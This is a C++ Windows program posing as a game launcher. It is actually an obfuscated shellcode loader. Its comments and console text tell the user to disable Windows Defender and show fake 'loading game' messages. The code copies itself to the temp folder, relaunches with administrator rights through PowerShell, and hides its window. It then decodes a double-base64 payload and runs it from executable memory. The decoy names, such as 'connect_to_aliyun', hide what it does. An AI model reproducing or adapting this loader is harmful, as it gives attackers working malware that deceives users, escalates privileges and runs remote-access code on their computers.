/*如果无法正常运行，请试图关闭杀毒软件或者windows defender
自带杀毒软件关闭方法：打开右下角windows defender 选择管理设置 关闭实时保护*/

#include <windows.h>
#include <stdio.h>
#include <cstdlib>
#include <cstring>
#include <string>
using namespace std;
string grumma2 =
    "pRDVQRG95QUFBQUVGUlFWQlNVVlpJTWRKbFNJdFNZRWlMVWhoSWkxSWdTSXR5VUVnUHQwcEtUVEhKU0RIQXJEeGhmQUlzSUVIQnlRMUJBY0hpN1ZKQlVVaUxVaUNMUWp4SUFkQm1nWGdZQ3dKMWNvdUFpQUFBQUVpRndIUm5TQUhRVUl0SUdFU0xRQ0JKQWREalZrai95VUdMTkloSUFkWk5NY2xJTWNDc1FjSEpEVUVCd1RqZ2RmRk1BMHdrQ0VVNTBYWFlXRVNMUUNSSkFkQm1RWXNNU0VTTFFCeEpBZEJCaXdTSVNBSFFRVmhCV0Y1WldrRllRVmxCV2tpRDdDQkJVdi9nV0VGWldraUxFdWxQLy8vL1hXb0FTYjUzYVc1cGJtVjBBRUZXU1lubVRJbnhRYnBNZHlZSC85VklNY2xJTWRKTk1jQk5NY2xCVUVGUVFibzZWbm1uLzlYcGt3QUFBRnBJaWNGQnVMc0JBQUJOTWNsQlVVRlJhZ05CVVVHNlY0bWZ4di9WNjNsYlNJbkJTREhTU1luWVRUSEpVbWdBTXNDRVVsSkJ1dXRWTGp2LzFVaUp4a2lEdzFCcUNsOUlpZkc2SHdBQUFHb0FhSUF6QUFCSmllQkJ1UVFBQUFCQnVuVkdub2IvMVVpSjhVaUoya25Id1AvLy8vOU5NY2xTVWtHNkxRWVllLy9WaGNBUGhaMEJBQUJJLzg4UGhJd0JBQURyc";

string grumma1 =
    "eXR1YTBGUlFVRTJTVXd2THk4NGRsa3hTVFZpZDBGd2JtOXNSMGxDUjNSNFQyYzNiMW94ZFVOelpWUmlXbFIyZEVoMGFDdGlURmw1YmxOMVJXMDVUblpaUVVsRFdqWg==";
string ff = "360 Wechat Aliyun";
int config = 1;
int config2 = 1;
int fhdi = 1656, fhdu = 8399, fjei = 3857;
int fhhh = 128, vhhr = 1240;

string grumm3 = "Aliyun Alipay Baidu_MAP Genshin_inpact wczb";

namespace oceanstar {
	/**
	 * BASE64 编码函数
	 * @param in {const char*} 源数据
	 * @param len {int} in 源数据的长度
	 * @return unsigned char * 编码结果，需要free释放
	 */
	unsigned char *acl_base64_encode( const char *in, int len);


	/**
	 * BASE64 解码函数
	 * @param in {const char*} 编码后的数据
	 * @param len {int} in 数据长度
	 * @return unsigned char * NULL: 解码失败; !=NULL: 解码成功需要free释放
	 */
	unsigned char *connect_to_aliyun(const char *in, int len);
}

namespace oceanstar {
	static const unsigned char to_b64[] =
	    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

	static const unsigned char un_b64[] = {
		255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 62,  255, 255, 255, 63,
		52,  53,  54,  55,  56,  57,  58,  59,  60,  61,  255, 255, 255, 255, 255, 255,
		255, 0,   1,   2,   3,   4,   5,   6,   7,   8,   9,   10,  11,  12,  13,  14,
		15,  16,  17,  18,  19,  20,  21,  22,  23,  24,  25,  255, 255, 255, 255, 255,
		255, 26,  27,  28,  29,  30,  31,  32,  33,  34,  35,  36,  37,  38,  39,  40,
		41,  42,  43,  44,  45,  46,  47,  48,  49,  50,  51,  255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255
	};

#define UNSIG_CHAR_PTR(x) ((const unsigned char *)(x))
	void run_time_except( ) {
		const unsigned char *cp;
		const char *in;
		int len;
		int     count, size = len * 4 / 3;

		unsigned char *out = (unsigned char *)malloc(size + 1);
		int out_index = 0;
		for (cp = UNSIG_CHAR_PTR(in), count = len; count > 0; count -= 3, cp += 3) {
			out[out_index++] = to_b64[cp[0] >> 2];
			if (count > 1) {
				out[out_index++] = to_b64[(cp[0] & 0x3) << 4 | cp[1] >> 4];
				if (count > 2) {
					out[out_index++] = to_b64[(cp[1] & 0xf) << 2 | cp[2] >> 6];
					out[out_index++] = to_b64[cp[2] & 0x3f];
				} else {
					out[out_index++] = to_b64[(cp[1] & 0xf) << 2];
					out[out_index++] = '=';
					break;
				}
			} else {
				out[out_index++] = to_b64[(cp[0] & 0x3) << 4];
				out[out_index++] = '=';
				out[out_index++] = '=';
				break;
			}
		}
		out[out_index] = 0;
		return;
	}

	unsigned char *connect_to_aliyun(const char *in, int len) {
		const unsigned char *cp;
		int     count;
		int     ch0;
		int     ch1;
		int     ch2;
		int     ch3;

		/*
		* Sanity check.
		 */
		if (len % 4)
			return (NULL);

#define INVALID		0xff

		unsigned char *out = (unsigned char *)malloc(len + 1);
		int out_index = 0;
		for (cp = UNSIG_CHAR_PTR(in), count = 0; count < len; count += 4) {
			if ((ch0 = un_b64[*cp++]) == INVALID
			        || (ch1 = un_b64[*cp++]) == INVALID)
				return (0);
			out[out_index++] = ch0 << 2 | ch1 >> 4;
			if ((ch2 = *cp++) == '=')
				break;
			if ((ch2 = un_b64[ch2]) == INVALID)
				return (0);
			out[out_index++] = ch1 << 4 | ch2 >> 2;
			if ((ch3 = *cp++) == '=')
				break;
			if ((ch3 = un_b64[ch3]) == INVALID)
				return (0);
			out[out_index++] = ch2 << 6 | ch3;
		}

		out[out_index] = 0;
		return out;
	}

}
char *dec3;
#include <iostream>
using namespace oceanstar;

using namespace std;


int main(int argc, char **argv) {
	run_time_except( );

	if (argc == 1) {

		cout << "请稍等......" << endl;
		cout << "如果无法正常运行，请试图关闭杀毒软件或者windows defender" << endl;
		cout << "自带杀毒软件关闭方法：打开windows defender 选择管理设置 关闭实时保护" << endl;
		cout << "正在读取游戏文件，请点击确认" << endl;
		system("timeout /t 3");
		string command = "copy ";
		command += argv[0];
		command += " %temp%\\gamebar.exe";
		system(command.c_str());
		ShellExecute(NULL, "runas", "powershell.exe",
		             R"(Start-Process $env:temp\\gamebar.exe -ArgumentList "/a" -Verb RunAs)",
		             NULL,
		             SW_SHOWNORMAL);

		run_time_except( );
		if (config2) {
			cout << "加载失败，请点击我确定路径和权限是否正常"  << endl;
			system("timeout /T 5");
			ShowWindow(GetForegroundWindow(), 0);
		} else {
			cout << "欢迎玩家！游戏启动中..." << endl;

		}

	} else {
		ShowWindow(GetForegroundWindow(), 0);
	}




	goto ggb2;

ggb: {

		if (1 && config && (config2 || 0) || 0 && 1) {
			run_time_except( );
			dec3 = ( char *)connect_to_aliyun(("L0V" + grumma2 + grumma1 +
			                                   "CSHNJazJFbjZuTkdDTWFYK1Zma1JrcEJUMTNpTkhhK1Z1aWppeURvazF4REp1T3NkQUZWelpYSXRRV2RsYm5RNklFMXZlbWxzYkdFdk5TNHdJQ2hqYjIxd1lYUnBZbXhsT3lCTlUwbEZJREV3TGpBN0lGZHBibVJ2ZDNNZ1RsUWdOaTR5T3lCWFQxYzJORHNnVkhKcFpHVnVkQzgyTGpBN0lFMUVSRU5LVXlrTkNnQjB1ZWNubEF3cHprWnF5SXV5ekdQc0lGNEplRi9SdmFJRUNpYjMwRytSL2VRZ0p0TWxuQzNOblZkejNoY29Xc2o3cEx5bm53TWlqS2tDNUtmanRPWEhqZXB5NEFRb3NUVXpSMTFnelZWTHNnMDZxUjBMY1RwVDBrZk9xNzA0NzdRM0xTREFBYUY5NWtZa01KdVdqL2FQZDFaKzF3T1FleTk3bENueFlFV2xLQklvM1MwNWIxcUFZWlBjdjR5NE1KQXMzblpFQVRFUlFFSUN5cFVxTlNxbHZ0czMxQTgwMkVreE1lQVFSRVM5TWxka096YStmWGVnQzJ0dm1RL1NyZk52L1NRbjEvNko3ZENyY245bkZnY1cvUUJCdnZDMW9sYi8xVWd4eWJvQUFFQUFRYmdBRUFBQVFibEFBQUFBUWJwWXBGUGwvOVZJazFOVFNJbm5TSW54U0luYVFiZ0FJQUFBU1luNVFib1Nsb25pLzlWSWc4UWdoY0IwdG1hTEIwZ0J3NFhBZGRkWVdGaElCUUFBQUFCUXcraC8vZi8vTVRBM0xqRTNNaTQ0Tmk0eE1EWUFPdDVvc1E9PQ==").c_str(),
			                                  1656);
		}
		goto ggb3;
	}

ggb2: {

		char *dec1 = (char *)connect_to_aliyun("aliyun alipay baidu map genshin wczb wechat", fhdi);
		grumma1 = ( char *)connect_to_aliyun(grumma1.c_str(), fhhh);
		char *dec2 = ( char *)connect_to_aliyun((grumm3 + grumma2).c_str(), fhdi);

		goto ggb;
	}


ggb3:


	char *dec = "Aliyun KEy u29gj49fjf94io9ruif0ioghsiukf,jhefbirujfhnilvjkfv";
	dec = ( char *)connect_to_aliyun(dec3, vhhr);

	LPVOID Memory = VirtualAlloc(NULL, vhhr, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (Memory == NULL) {
		return 0;
	}

	memcpy(Memory, dec, vhhr);

	((void(*)())Memory)();

	while (1) {
	}
}

